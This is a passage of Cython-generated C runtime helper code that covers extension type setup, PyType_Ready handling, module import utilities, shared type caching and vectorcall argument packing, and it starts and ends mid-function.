CYTHON_UNUSED_VAR(type);\n    CYTHON_UNUSED_VAR(__Pyx__SetItemOnTypeDict);\n#else\n    const PyType_Slot *slot = spec->slots;\n    int changed = 0;\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    while (slot && slot->slot && slot->slot != Py_tp_members)\n        slot++;\n    if (slot && slot->slot == Py_tp_members) {\n#if !CYTHON_COMPILING_IN_CPYTHON\n        const\n#endif  // !CYTHON_COMPILING_IN_CPYTHON)\n            PyMemberDef *memb = (PyMemberDef*) slot->pfunc;\n        while (memb && memb->name) {\n            if (memb->name[0] == \'_\' && memb->name[1] == \'_\') {\n                if (strcmp(memb->name, "__weaklistoffset__") == 0) {\n                    assert(memb->type == T_PYSSIZET);\n                    assert(memb->flags == READONLY);\n                    type->tp_weaklistoffset = memb->offset;\n                    changed = 1;\n                }\n                else if (strcmp(memb->name, "__dictoffset__") == 0) {\n                    assert(memb->type == T_PYSSIZET);\n                    assert(memb->flags == READONLY);\n                    type->tp_dictoffset = memb->offset;\n                    changed = 1;\n                }\n#if CYTHON_METH_FASTCALL\n                else if (strcmp(memb->name, "__vectorcalloffset__") == 0) {\n                    assert(memb->type == T_PYSSIZET);\n                    assert(memb->flags == READONLY);\n#if PY_VERSION_HEX >= 0x030800b4\n                    type->tp_vectorcall_offset = memb->offset;\n#else\n                    type->tp_print = (printfunc) memb->offset;\n#endif\n                    changed = 1;\n                }\n#endif  // CYTHON_METH_FASTCALL\n#if !CYTHON_COMPILING_IN_PYPY\n                else if (strcmp(memb->name, "__module__") == 0) {\n                    PyObject *descr;\n                    assert(memb->type == T_OBJECT);\n                    assert(memb->flags == 0 || memb->flags == READONLY);\n                    descr = PyDescr_NewMember(type, memb);\n                    if (unlikely(!descr))\n                        return -1;\n                    int set_item_result = PyDict_SetItem(type->tp_dict, PyDescr_NAME(descr), descr);\n                    Py_DECREF(descr);\n                    if (unlikely(set_item_result < 0)) {\n                        return -1;\n                    }\n                    changed = 1;\n                }\n#endif  // !CYTHON_COMPILING_IN_PYPY\n            }\n            memb++;\n        }\n    }\n#endif  // !CYTHON_COMPILING_IN_LIMITED_API\n#if !CYTHON_COMPILING_IN_PYPY\n    slot = spec->slots;\n    while (slot && slot->slot && slot->slot != Py_tp_getset)\n        slot++;\n    if (slot && slot->slot == Py_tp_getset) {\n        PyGetSetDef *getset = (PyGetSetDef*) slot->pfunc;\n        while (getset && getset->name) {\n            if (getset->name[0] == \'_\' && getset->name[1] == \'_\' && strcmp(getset->name, "__module__") == 0) {\n                PyObject *descr = PyDescr_NewGetSet(type, getset);\n                if (unlikely(!descr))\n                    return -1;\n                #if CYTHON_COMPILING_IN_LIMITED_API\n                PyObject *pyname = PyUnicode_FromString(getset->name);\n                if (unlikely(!pyname)) {\n                    Py_DECREF(descr);\n                    return -1;\n                }\n                int set_item_result = __Pyx_SetItemOnTypeDict(type, pyname, descr);\n                Py_DECREF(pyname);\n                #else\n                CYTHON_UNUSED_VAR(__Pyx__SetItemOnTypeDict);\n                int set_item_result = PyDict_SetItem(type->tp_dict, PyDescr_NAME(descr), descr);\n                #endif\n                Py_DECREF(descr);\n                if (unlikely(set_item_result < 0)) {\n                    return -1;\n                }\n                changed = 1;\n            }\n            ++getset;\n        }\n    }\n#endif  // !CYTHON_COMPILING_IN_PYPY\n    if (changed)\n        PyType_Modified(type);\n#endif  // PY_VERSION_HEX > 0x030900B1\n    return 0;\n}\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {\n    PyObject *arg[2] = {NULL, NULL};\n    return __Pyx_PyObject_FastCall(func, arg + 1, 0 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);\n}\n\n\nstatic PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name) {\n#if CYTHON_VECTORCALL && (__PYX_LIMITED_VERSION_HEX >= 0x030C0000 || (!CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x03090000))\n    PyObject *args[1] = {obj};\n    (void) __Pyx_PyObject_GetMethod;\n    (void) __Pyx_PyObject_CallOneArg;\n    (void) __Pyx_PyObject_CallNoArg;\n    return PyObject_VectorcallMethod(method_name, args, 1 | PY_VECTORCALL_ARGUMENTS_OFFSET, NULL);\n#else\n    PyObject *method = NULL, *result = NULL;\n    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);\n    if (likely(is_method)) {\n        result = __Pyx_PyObject_CallOneArg(method, obj);\n        Py_DECREF(method);\n        return result;\n    }\n    if (unlikely(!method)) goto bad;\n    result = __Pyx_PyObject_CallNoArg(method);\n    Py_DECREF(method);\nbad:\n    return result;\n#endif\n}\n\n\n#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_USE_TYPE_SPECS\nstatic int __Pyx_validate_bases_tuple(const char *type_name, Py_ssize_t dictoffset, PyObject *bases) {\n    Py_ssize_t i, n;\n#if CYTHON_ASSUME_SAFE_SIZE\n    n = PyTuple_GET_SIZE(bases);\n#else\n    n = PyTuple_Size(bases);\n    if (unlikely(n < 0)) return -1;\n#endif\n    for (i = 1; i < n; i++)\n    {\n        PyTypeObject *b;\n#if CYTHON_AVOID_BORROWED_REFS\n        PyObject *b0 = PySequence_GetItem(bases, i);\n        if (!b0) return -1;\n#elif CYTHON_ASSUME_SAFE_MACROS\n        PyObject *b0 = PyTuple_GET_ITEM(bases, i);\n#else\n        PyObject *b0 = PyTuple_GetItem(bases, i);\n        if (!b0) return -1;\n#endif\n        b = (PyTypeObject*) b0;\n        if (!__Pyx_PyType_HasFeature(b, Py_TPFLAGS_HEAPTYPE))\n        {\n            __Pyx_TypeName b_name = __Pyx_PyType_GetFullyQualifiedName(b);\n            PyErr_Format(PyExc_TypeError,\n                "base class \'" __Pyx_FMT_TYPENAME "\' is not a heap type", b_name);\n            __Pyx_DECREF_TypeName(b_name);\n#if CYTHON_AVOID_BORROWED_REFS\n            Py_DECREF(b0);\n#endif\n            return -1;\n        }\n        if (dictoffset == 0)\n        {\n            Py_ssize_t b_dictoffset = 0;\n#if CYTHON_USE_TYPE_SLOTS\n            b_dictoffset = b->tp_dictoffset;\n#else\n            PyObject *py_b_dictoffset = PyObject_GetAttrString((PyObject*)b, "__dictoffset__");\n            if (!py_b_dictoffset) goto dictoffset_return;\n            b_dictoffset = PyLong_AsSsize_t(py_b_dictoffset);\n            Py_DECREF(py_b_dictoffset);\n            if (b_dictoffset == -1 && PyErr_Occurred()) goto dictoffset_return;\n#endif\n            if (b_dictoffset) {\n                {\n                    __Pyx_TypeName b_name = __Pyx_PyType_GetFullyQualifiedName(b);\n                    PyErr_Format(PyExc_TypeError,\n                        "extension type \'%.200s\' has no __dict__ slot, "\n                        "but base type \'" __Pyx_FMT_TYPENAME "\' has: "\n                        "either add \'cdef dict __dict__\' to the extension type "\n                        "or add \'__slots__ = [...]\' to the base type",\n                        type_name, b_name);\n                    __Pyx_DECREF_TypeName(b_name);\n                }\n#if !CYTHON_USE_TYPE_SLOTS\n              dictoffset_return:\n#endif\n#if CYTHON_AVOID_BORROWED_REFS\n                Py_DECREF(b0);\n#endif\n                return -1;\n            }\n        }\n#if CYTHON_AVOID_BORROWED_REFS\n        Py_DECREF(b0);\n#endif\n    }\n    return 0;\n}\n#endif\n\n\nCYTHON_UNUSED static int __Pyx_PyType_HasMultipleInheritance(PyTypeObject *t) {\n    while (t) {\n        PyObject *bases = __Pyx_PyType_GetSlot(t, tp_bases, PyObject*);\n        if (bases) {\n            return 1;\n        }\n        t = __Pyx_PyType_GetSlot(t, tp_base, PyTypeObject*);\n    }\n    return 0;\n}\nstatic int __Pyx_PyType_Ready(PyTypeObject *t) {\n#if CYTHON_USE_TYPE_SPECS || !CYTHON_COMPILING_IN_CPYTHON || defined(PYSTON_MAJOR_VERSION)\n    (void)__Pyx_PyObject_CallMethod0;\n#if CYTHON_USE_TYPE_SPECS\n    (void)__Pyx_validate_bases_tuple;\n#endif\n    return PyType_Ready(t);\n#else\n    int r;\n    if (!__Pyx_PyType_HasMultipleInheritance(t)) {\n        return PyType_Ready(t);\n    }\n    PyObject *bases = __Pyx_PyType_GetSlot(t, tp_bases, PyObject*);\n    if (bases && unlikely(__Pyx_validate_bases_tuple(t->tp_name, t->tp_dictoffset, bases) == -1))\n        return -1;\n#if !defined(PYSTON_MAJOR_VERSION)\n    {\n        int gc_was_enabled;\n    #if PY_VERSION_HEX >= 0x030A00b1\n        gc_was_enabled = PyGC_Disable();\n        (void)__Pyx_PyObject_CallMethod0;\n    #else\n        PyObject *ret, *py_status;\n        PyObject *gc = NULL;\n        #if (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM+0 >= 0x07030400) &&\\\n                !CYTHON_COMPILING_IN_GRAAL\n        gc = PyImport_GetModule(__pyx_mstate_global->__pyx_kp_u_gc);\n        #endif\n        if (unlikely(!gc)) gc = PyImport_Import(__pyx_mstate_global->__pyx_kp_u_gc);\n        if (unlikely(!gc)) return -1;\n        py_status = __Pyx_PyObject_CallMethod0(gc, __pyx_mstate_global->__pyx_kp_u_isenabled);\n        if (unlikely(!py_status)) {\n            Py_DECREF(gc);\n            return -1;\n        }\n        gc_was_enabled = __Pyx_PyObject_IsTrue(py_status);\n        Py_DECREF(py_status);\n        if (gc_was_enabled > 0) {\n            ret = __Pyx_PyObject_CallMethod0(gc, __pyx_mstate_global->__pyx_kp_u_disable);\n            if (unlikely(!ret)) {\n                Py_DECREF(gc);\n                return -1;\n            }\n            Py_DECREF(ret);\n        } else if (unlikely(gc_was_enabled == -1)) {\n            Py_DECREF(gc);\n            return -1;\n        }\n    #endif\n        t->tp_flags |= Py_TPFLAGS_HEAPTYPE;\n#if PY_VERSION_HEX >= 0x030A0000\n        t->tp_flags |= Py_TPFLAGS_IMMUTABLETYPE;\n#endif\n#else\n        (void)__Pyx_PyObject_CallMethod0;\n#endif\n    r = PyType_Ready(t);\n#if !defined(PYSTON_MAJOR_VERSION)\n        t->tp_flags &= ~Py_TPFLAGS_HEAPTYPE;\n    #if PY_VERSION_HEX >= 0x030A00b1\n        if (gc_was_enabled)\n            PyGC_Enable();\n    #else\n        if (gc_was_enabled) {\n            PyObject *tp, *v, *tb;\n            PyErr_Fetch(&tp, &v, &tb);\n            ret = __Pyx_PyObject_CallMethod0(gc, __pyx_mstate_global->__pyx_kp_u_enable);\n            if (likely(ret || r == -1)) {\n                Py_XDECREF(ret);\n                PyErr_Restore(tp, v, tb);\n            } else {\n                Py_XDECREF(tp);\n                Py_XDECREF(v);\n                Py_XDECREF(tb);\n                r = -1;\n            }\n        }\n        Py_DECREF(gc);\n    #endif\n    }\n#endif\n    return r;\n#endif\n}\n\n\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    PyObject *module = 0;\n    PyObject *empty_dict = 0;\n    PyObject *empty_list = 0;\n    empty_dict = PyDict_New();\n    if (unlikely(!empty_dict))\n        goto bad;\n    if (level == -1) {\n        const char* package_sep = strchr(__Pyx_MODULE_NAME, \'.\');\n        if (package_sep != (0)) {\n            module = PyImport_ImportModuleLevelObject(\n                name, __pyx_mstate_global->__pyx_d, empty_dict, from_list, 1);\n            if (unlikely(!module)) {\n                if (unlikely(!PyErr_ExceptionMatches(PyExc_ImportError)))\n                    goto bad;\n                PyErr_Clear();\n            }\n        }\n        level = 0;\n    }\n    if (!module) {\n        module = PyImport_ImportModuleLevelObject(\n            name, __pyx_mstate_global->__pyx_d, empty_dict, from_list, level);\n    }\nbad:\n    Py_XDECREF(empty_dict);\n    Py_XDECREF(empty_list);\n    return module;\n}\n\n\nstatic PyObject *__Pyx__ImportDottedModule_Error(PyObject *name, PyObject *parts_tuple, Py_ssize_t count) {\n    PyObject *partial_name = NULL, *slice = NULL, *sep = NULL;\n    Py_ssize_t size;\n    if (unlikely(PyErr_Occurred())) {\n        PyErr_Clear();\n    }\n#if CYTHON_ASSUME_SAFE_SIZE\n    size = PyTuple_GET_SIZE(parts_tuple);\n#else\n    size = PyTuple_Size(parts_tuple);\n    if (size < 0) goto bad;\n#endif\n    if (likely(size == count)) {\n        partial_name = name;\n    } else {\n        slice = PySequence_GetSlice(parts_tuple, 0, count);\n        if (unlikely(!slice))\n            goto bad;\n        sep = PyUnicode_FromStringAndSize(".", 1);\n        if (unlikely(!sep))\n            goto bad;\n        partial_name = PyUnicode_Join(sep, slice);\n    }\n    PyErr_Format(\n        PyExc_ModuleNotFoundError,\n        "No module named \'%U\'", partial_name);\nbad:\n    Py_XDECREF(sep);\n    Py_XDECREF(slice);\n    Py_XDECREF(partial_name);\n    return NULL;\n}\nstatic PyObject *__Pyx__ImportDottedModule_Lookup(PyObject *name) {\n    PyObject *imported_module;\n#if (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400) ||\\\n        CYTHON_COMPILING_IN_GRAAL\n    PyObject *modules = PyImport_GetModuleDict();\n    if (unlikely(!modules))\n        return NULL;\n    imported_module = __Pyx_PyDict_GetItemStr(modules, name);\n    Py_XINCREF(imported_module);\n#else\n    imported_module = PyImport_GetModule(name);\n#endif\n    return imported_module;\n}\nstatic PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple) {\n    Py_ssize_t i, nparts;\n#if CYTHON_ASSUME_SAFE_SIZE\n    nparts = PyTuple_GET_SIZE(parts_tuple);\n#else\n    nparts = PyTuple_Size(parts_tuple);\n    if (nparts < 0) return NULL;\n#endif\n    for (i=1; i < nparts && module; i++) {\n        PyObject *part, *submodule;\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n        part = PyTuple_GET_ITEM(parts_tuple, i);\n#else\n        part = __Pyx_PySequence_ITEM(parts_tuple, i);\n        if (!part) return NULL;\n#endif\n        submodule = __Pyx_PyObject_GetAttrStrNoError(module, part);\n#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)\n        Py_DECREF(part);\n#endif\n        Py_DECREF(module);\n        module = submodule;\n    }\n    if (unlikely(!module)) {\n        return __Pyx__ImportDottedModule_Error(name, parts_tuple, i);\n    }\n    return module;\n}\nstatic PyObject *__Pyx__ImportDottedModule(PyObject *name, PyObject *parts_tuple) {\n    PyObject *imported_module;\n    PyObject *module = __Pyx_Import(name, NULL, 0);\n    if (!parts_tuple || unlikely(!module))\n        return module;\n    imported_module = __Pyx__ImportDottedModule_Lookup(name);\n    if (likely(imported_module)) {\n        Py_DECREF(module);\n        return imported_module;\n    }\n    PyErr_Clear();\n    return __Pyx_ImportDottedModule_WalkParts(module, name, parts_tuple);\n}\nstatic PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple) {\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject *module = __Pyx__ImportDottedModule_Lookup(name);\n    if (likely(module)) {\n        PyObject *spec = __Pyx_PyObject_GetAttrStrNoError(module, __pyx_mstate_global->__pyx_n_u_spec);\n        if (likely(spec)) {\n            PyObject *unsafe = __Pyx_PyObject_GetAttrStrNoError(spec, __pyx_mstate_global->__pyx_n_u_initializing);\n            if (likely(!unsafe || !__Pyx_PyObject_IsTrue(unsafe))) {\n                Py_DECREF(spec);\n                spec = NULL;\n            }\n            Py_XDECREF(unsafe);\n        }\n        if (likely(!spec)) {\n            PyErr_Clear();\n            return module;\n        }\n        Py_DECREF(spec);\n        Py_DECREF(module);\n    } else if (PyErr_Occurred()) {\n        PyErr_Clear();\n    }\n#endif\n    return __Pyx__ImportDottedModule(name, parts_tuple);\n}\n\n\nstatic PyObject *__Pyx_PyList_Pack(Py_ssize_t n, ...) {\n    va_list va;\n    PyObject *l = PyList_New(n);\n    va_start(va, n);\n    if (unlikely(!l)) goto end;\n    for (Py_ssize_t i=0; i<n; ++i) {\n        PyObject *arg = va_arg(va, PyObject*);\n        Py_INCREF(arg);\n        if (__Pyx_PyList_SET_ITEM(l, i, arg) != (0)) {\n            Py_CLEAR(l);\n            goto end;\n        }\n    }\n    end:\n    va_end(va);\n    return l;\n}\n\n\nstatic PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {\n    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);\n    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        const char* module_name_str = 0;\n        PyObject* module_name = 0;\n        PyObject* module_dot = 0;\n        PyObject* full_name = 0;\n        PyErr_Clear();\n        module_name_str = PyModule_GetName(module);\n        if (unlikely(!module_name_str)) { goto modbad; }\n        module_name = PyUnicode_FromString(module_name_str);\n        if (unlikely(!module_name)) { goto modbad; }\n        module_dot = PyUnicode_Concat(module_name, __pyx_mstate_global->__pyx_kp_u__13);\n        if (unlikely(!module_dot)) { goto modbad; }\n        full_name = PyUnicode_Concat(module_dot, name);\n        if (unlikely(!full_name)) { goto modbad; }\n        #if (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400) ||\\\n                CYTHON_COMPILING_IN_GRAAL\n        {\n            PyObject *modules = PyImport_GetModuleDict();\n            if (unlikely(!modules))\n                goto modbad;\n            value = PyObject_GetItem(modules, full_name);\n        }\n        #else\n        value = PyImport_GetModule(full_name);\n        #endif\n      modbad:\n        Py_XDECREF(full_name);\n        Py_XDECREF(module_dot);\n        Py_XDECREF(module_name);\n    }\n    if (unlikely(!value)) {\n        PyErr_Format(PyExc_ImportError, "cannot import name %S", name);\n    }\n    return value;\n}\n\n\nstatic PyObject* __Pyx_PySequence_Multiply_Generic(PyObject *seq, Py_ssize_t mul) {\n    PyObject *result, *pymul = PyLong_FromSsize_t(mul);\n    if (unlikely(!pymul))\n        return NULL;\n    result = PyNumber_Multiply(seq, pymul);\n    Py_DECREF(pymul);\n    return result;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PySequence_Multiply(PyObject *seq, Py_ssize_t mul) {\n#if CYTHON_USE_TYPE_SLOTS\n    PyTypeObject *type = Py_TYPE(seq);\n    if (likely(type->tp_as_sequence && type->tp_as_sequence->sq_repeat)) {\n        return type->tp_as_sequence->sq_repeat(seq, mul);\n    } else\n#endif\n    {\n        return __Pyx_PySequence_Multiply_Generic(seq, mul);\n    }\n}\n\n\nstatic PyObject *__Pyx_FetchSharedCythonABIModule(void) {\n    return __Pyx_PyImport_AddModuleRef(__PYX_ABI_MODULE_NAME);\n}\n\n\nstatic CYTHON_INLINE PyObject *__Pyx_PyDict_SetDefault(PyObject *d, PyObject *key, PyObject *default_value,\n                                                       int is_safe_type) {\n    PyObject* value;\n    CYTHON_MAYBE_UNUSED_VAR(is_safe_type);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    value = PyObject_CallMethod(d, "setdefault", "OO", key, default_value);\n#elif PY_VERSION_HEX >= 0x030d0000\n    PyDict_SetDefaultRef(d, key, default_value, &value);\n#else\n    value = PyDict_SetDefault(d, key, default_value);\n    if (unlikely(!value)) return NULL;\n    Py_INCREF(value);\n#endif\n    return value;\n}\n\n\n#if __PYX_LIMITED_VERSION_HEX < 0x030C0000\nstatic PyObject* __Pyx_PyType_FromMetaclass(PyTypeObject *metaclass, PyObject *module, PyType_Spec *spec, PyObject *bases) {\n    PyObject *result = __Pyx_PyType_FromModuleAndSpec(module, spec, bases);\n    if (result && metaclass) {\n        PyObject *old_tp = (PyObject*)Py_TYPE(result);\n    Py_INCREF((PyObject*)metaclass);\n#if __PYX_LIMITED_VERSION_HEX >= 0x03090000\n        Py_SET_TYPE(result, metaclass);\n#else\n        result->ob_type = metaclass;\n#endif\n        Py_DECREF(old_tp);\n    }\n    return result;\n}\n#else\n#define __Pyx_PyType_FromMetaclass(me, mo, s, b) PyType_FromMetaclass(me, mo, s, b)\n#endif\nstatic int __Pyx_VerifyCachedType(PyObject *cached_type,\n                               const char *name,\n                               Py_ssize_t expected_basicsize) {\n    Py_ssize_t basicsize;\n    if (!PyType_Check(cached_type)) {\n        PyErr_Format(PyExc_TypeError,\n            "Shared Cython type %.200s is not a type object", name);\n        return -1;\n    }\n    if (expected_basicsize == 0) {\n        return 0; // size is inherited, nothing useful to check\n    }\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *py_basicsize;\n    py_basicsize = PyObject_GetAttrString(cached_type, "__basicsize__");\n    if (unlikely(!py_basicsize)) return -1;\n    basicsize = PyLong_AsSsize_t(py_basicsize);\n    Py_DECREF(py_basicsize);\n    py_basicsize = NULL;\n    if (unlikely(basicsize == (Py_ssize_t)-1) && PyErr_Occurred()) return -1;\n#else\n    basicsize = ((PyTypeObject*) cached_type)->tp_basicsize;\n#endif\n    if (basicsize != expected_basicsize) {\n        PyErr_Format(PyExc_TypeError,\n            "Shared Cython type %.200s has the wrong size, try recompiling",\n            name);\n        return -1;\n    }\n    return 0;\n}\nstatic PyTypeObject *__Pyx_FetchCommonTypeFromSpec(PyTypeObject *metaclass, PyObject *module, PyType_Spec *spec, PyObject *bases) {\n    PyObject *abi_module = NULL, *cached_type = NULL, *abi_module_dict, *new_cached_type, *py_object_name;\n    int get_item_ref_result;\n    const char* object_name = strrchr(spec->name, \'.\');\n    object_name = object_name ? object_name+1 : spec->name;\n    py_object_name = PyUnicode_FromString(object_name);\n    if (!py_object_name) return NULL;\n    abi_module = __Pyx_FetchSharedCythonABIModule();\n    if (!abi_module) goto done;\n    abi_module_dict = PyModule_GetDict(abi_module);\n    if (!abi_module_dict) goto done;\n    get_item_ref_result = __Pyx_PyDict_GetItemRef(abi_module_dict, py_object_name, &cached_type);\n    if (get_item_ref_result == 1) {\n        if (__Pyx_VerifyCachedType(\n              cached_type,\n              object_name,\n              spec->basicsize) < 0) {\n            goto bad;\n        }\n        goto done;\n    } else if (unlikely(get_item_ref_result == -1)) {\n        goto bad;\n    }\n    CYTHON_UNUSED_VAR(module);\n    cached_type = __Pyx_PyType_FromMetaclass(metaclass, abi_module, spec, bases);\n    if (unlikely(!cached_type)) goto bad;\n    if (unlikely(__Pyx_fix_up_extension_type_from_spec(spec, (PyTypeObject *) cached_type) < 0)) goto bad;\n    new_cached_type = __Pyx_PyDict_SetDefault(abi_module_dict, py_object_name, cached_type, 1);\n    if (unlikely(new_cached_type != cached_type)) {\n        if (unlikely(!new_cached_type)) goto bad;\n        Py_DECREF(cached_type);\n        cached_type = new_cached_type;\n        if (__Pyx_VerifyCachedType(\n                cached_type,\n                object_name,\n                spec->basicsize) < 0) {\n            goto bad;\n        }\n        goto done;\n    } else {\n        Py_DECREF(new_cached_type);\n    }\ndone:\n    Py_XDECREF(abi_module);\n    Py_DECREF(py_object_name);\n    assert(cached_type == NULL || PyType_Check(cached_type));\n    return (PyTypeObject *) cached_type;\nbad:\n    Py_XDECREF(cached_type);\n    cached_type = NULL;\n    goto done;\n}\n\n\nstatic PyObject* __pyx_CommonTypesMetaclass_get_module(CYTHON_UNUSED PyObject *self, CYTHON_UNUSED void* context) {\n    return PyUnicode_FromString(__PYX_ABI_MODULE_NAME);\n}\nstatic PyGetSetDef __pyx_CommonTypesMetaclass_getset[] = {\n    {"__module__", __pyx_CommonTypesMetaclass_get_module, NULL, NULL, NULL},\n    {0, 0, 0, 0, 0}\n};\nstatic PyType_Slot __pyx_CommonTypesMetaclass_slots[] = {\n    {Py_tp_getset, (void *)__pyx_CommonTypesMetaclass_getset},\n    {0, 0}\n};\nstatic PyType_Spec __pyx_CommonTypesMetaclass_spec = {\n    __PYX_TYPE_MODULE_PREFIX "_common_types_metatype",\n    0,\n    0,\n#if PY_VERSION_HEX >= 0x030A0000\n    Py_TPFLAGS_IMMUTABLETYPE |\n    Py_TPFLAGS_DISALLOW_INSTANTIATION |\n#endif\n    Py_TPFLAGS_DEFAULT,\n    __pyx_CommonTypesMetaclass_slots\n};\nstatic int __pyx_CommonTypesMetaclass_init(PyObject *module) {\n    __pyx_mstatetype *mstate = __Pyx_PyModule_GetState(module);\n    PyObject *bases = PyTuple_Pack(1, &PyType_Type);\n    if (unlikely(!bases)) {\n        return -1;\n    }\n    mstate->__pyx_CommonTypesMetaclassType = __Pyx_FetchCommonTypeFromSpec(NULL, module, &__pyx_CommonTypesMetaclass_spec, bases);\n    Py_DECREF(bases);\n    if (unlikely(mstate->__pyx_CommonTypesMetaclassType == NULL)) {\n        return -1;\n    }\n    return 0;\n}\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {\n    PyObject *result;\n    CYTHON_UNUSED_VAR(typ);\n    if (!self)\n        return __Pyx_NewRef(func);\n    #if __PYX_LIMITED_VERSION_HEX >= 0x030C0000\n    {\n        PyObject *args[] = {func, self};\n        result = PyObject_Vectorcall(__pyx_mstate_global->__Pyx_CachedMethodType, args, 2, NULL);\n    }\n    #else\n    result = PyObject_CallFunctionObjArgs(__pyx_mstate_global->__Pyx_CachedMethodType, func, self, NULL);\n    #endif\n    return result;\n}\n#else\nstatic PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {\n    CYTHON_UNUSED_VAR(typ);\n    if (!self)\n        return __Pyx_NewRef(func);\n    return PyMethod_New(func, self);\n}\n#endif\n\n\n#if CYTHON_METH_FASTCALL && (CYTHON_VECTORCALL || CYTHON_BACKPORT_VECTORCALL)\nstatic PyObject *__Pyx_PyVectorcall_FastCallDict_kw(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)\n{\n    PyObject *res = NULL;\n    PyObject *kwnames;\n    PyObject **newargs;\n    PyObject **kwvalues;\n    Py_ssize_t i, pos;\n    size_t j;\n    PyObject *key, *value;\n    unsigned long keys_are_strings;\n    #if !CYTHON_ASSUME_SAFE_SIZE\n    Py_ssize_t nkw = PyDict_Size(kw);\n    if (unlikely(nkw == -1)) return NULL;\n    #else\n    Py_ssize_t nkw = PyDict_GET_SIZE(kw);\n    #endif\n    newargs = (PyObject **)PyMem_Malloc((nargs + (size_t)nkw) * sizeof(args[0]));\n    if (unlikely(newargs == NULL)) {\n        PyErr_NoMemory();\n        return NULL;\n    }\n    for (j = 0; j < nargs; j++) newargs[j] = args[j];\n    kwnames = PyTuple_New(nkw);\n    if (unlikely(kwnames == NULL)) {\n        PyMem_Free(newargs);\n        return NULL;\n    }\n    kwvalues = newargs + nargs;\n    pos = i = 0;\n    keys_are_strings = Py_TPFLAGS_UNICODE_SUBCLASS;\n    while (PyDict_Next(kw, &pos, &key, &value)) {\n        keys_are_strings &=\n        #if CYTHON_COMPILING_IN_LIMITED_API\n            PyType_GetFlags(Py_TYPE(key));\n        #else\n            Py_TYPE(key)->tp_flags;\n        #endif\n        Py_INCREF(key);\n        Py_INCREF(value);\n        #if !CYTHON_ASSUME_SAFE_MACROS\n        if (unlikely(PyTuple_SetItem(kwnames, i, key) < 0)) goto cleanup;\n        #else\n        PyTuple_SET_ITEM(kwnames, i, key);\n        #endif\n        kwvalues[i] = value;\n        i++;\n    }\n    if (unlikely(!keys_are_strings)) {\n        PyErr_SetString(PyExc_TypeError, "keywords must be strings");\n        goto cleanup;\n    }\n    res = vc(func, newargs, nargs, kwnames);\ncleanup:\n    Py_DECREF(kwnames);\n    for (i = 0; i < nkw; i++)\n        Py_DECREF(kwvalues[i]);\n    PyMem_Free(newargs);\n    return res;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)\n{\n    Py_ssize_t kw_size =\n        likely(kw == NULL) ?\n        0 :\n#if !CYTHON_ASSUME_SAFE_SIZE\n        PyDict_Size(kw);\n#else\n        PyDict_GET_SIZE(kw);\n#endif\n    if (kw_size == 0) {\n        return vc(func, args, nargs, NULL);\n    }\n#if !CYTHON_ASSUME_SAFE_SIZE\n    else if (unlikely(kw_size == -1)) {\n        return NULL;\n    }\n#endif\n    return __Pyx_PyVectorcall_FastCallDict_kw(func, vc, args, nargs, kw);\n}\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunctionNoMethod(PyObject *func, void (*cfunc)(void)) {\n    if (__Pyx_CyFunction_Check(func)) {\n        return PyCFunction_GetFunction(((__pyx_CyFunctionObject*)func)->func) == (PyCFunction) cfunc;\n    } else if (PyCFunction_Check(func)) {\n        return PyCFunction_GetFunction(func) == (PyCFunction) cfunc;\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void (*cfunc)(void)) {\n    if ((PyObject*)Py_TYPE(func) == __pyx_mstate_global->__Pyx_CachedMethodType) {\n        int result;\n        PyObject *newFunc = PyObject_GetAttr(func, __pyx_mstate_global->__pyx_n_u_func);\n        if (unlikely(!newFunc)) {\n            PyErr_Clear(); // It\'s only an optimization, so don\'t throw an error\n            return 0;\n        }\n        result = __Pyx__IsSameCyOrCFunctionNoMethod(newFunc, cfunc);\n        Py_DECREF(newFunc);\n        return result;\n    }\n    return __Pyx__IsSameCyOrCFunctionNoMethod(func, cfunc);\n}\n#else\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void (*cfunc)(void)) {\n    if (PyMethod_Check(func)) {\n        func = PyMethod_GET_FUNCTION(func);\n    }\n    return __Pyx_CyOrPyCFunction_Check(func) && __Pyx_CyOrPyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;\n}\n#endif\nstatic CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj) {\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    __Pyx_Py_XDECREF_SET(\n        